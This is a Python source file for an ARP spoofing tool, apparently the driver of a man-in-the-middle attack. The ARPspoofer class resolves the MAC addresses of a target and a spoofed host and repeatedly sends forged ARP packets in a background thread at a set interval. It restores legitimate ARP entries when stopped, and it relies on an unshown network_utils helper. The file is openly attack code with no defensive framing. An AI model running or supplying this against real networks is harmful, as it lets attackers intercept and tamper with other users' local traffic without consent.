"""Instances of this class must be used to execute attacks."""
import network_utils
import time
import threading
from ipaddress import IPv4Address, AddressValueError

class ARPspoofer:


    def __init__(self,spoofed_ip:str,target_ip:str):
        if self._ip_is_valid(spoofed_ip) and self._ip_is_valid(target_ip):
            self.spoofed_ip = spoofed_ip
            self.target_ip = target_ip
        else:
            raise ValueError('Formato de IPs inválido.')
        
        self.target_mac = None
        self.spoofed_packets = None
        self.legitime_packets = None
        self.spoofed_mac = None
        self.stop_event = threading.Event()
        

    # ************************ Starts the attack by defining the intensity of the ARP spoofing. (Intensity is the time of delay between each ARP packet)
    def start_attack(self,resolving_attempts,intensity):
        self._resolve_mac(resolving_attempts)
        self._build_packets()
        self.attack = threading.Thread(target=self._run_loop, args=(intensity,), daemon=True)
        self.stop_event.set()
        self.attack.start()
    #***************************************************************************************************************************************************


    def stop_attack(self):
        self.stop_event.clear()
        self._restore()
        self.attack.join()
        
    

    def _resolve_mac(self,resolving_attempts):
        self.target_mac = network_utils.get_mac(self.target_ip,resolving_attempts)
        self.spoofed_mac = network_utils.get_mac(self.spoofed_ip,resolving_attempts)
        if self.target_mac == None or self.spoofed_mac == None:
            raise RuntimeError('Resolución de MAC imposible') 
        

    def _build_packets(self):
        self.packets = network_utils.spoof_arp(self.target_mac,self.spoofed_ip,self.target_ip,self.spoofed_mac)
        pass

    def _run_loop(self,intensity):
        while self.stop_event.is_set():
            network_utils.send_arp(self.packets)
            time.sleep(intensity)
            
    def _restore(self):
        # Creates a legitime frame to be sent to the target.
        packet1 = network_utils.build_legitime_arp(self.target_mac,self.target_ip,self.spoofed_mac,self.spoofed_ip)
        # Creates a legitime frame to be sent to the router/spoofed device.
        packet2 = network_utils.build_legitime_arp(self.spoofed_mac,self.spoofed_ip,self.target_mac,self.target_ip)
        for _ in range(0,2):
            network_utils.send_arp((packet1,packet2))

        
# *********** Checks if the ip's are in a valid format. **************
    def _ip_is_valid(self,ip:str) -> bool:
        try:
            IPv4Address(ip)
        except AddressValueError:
            return False
        else:
            return True
# **********************************************************************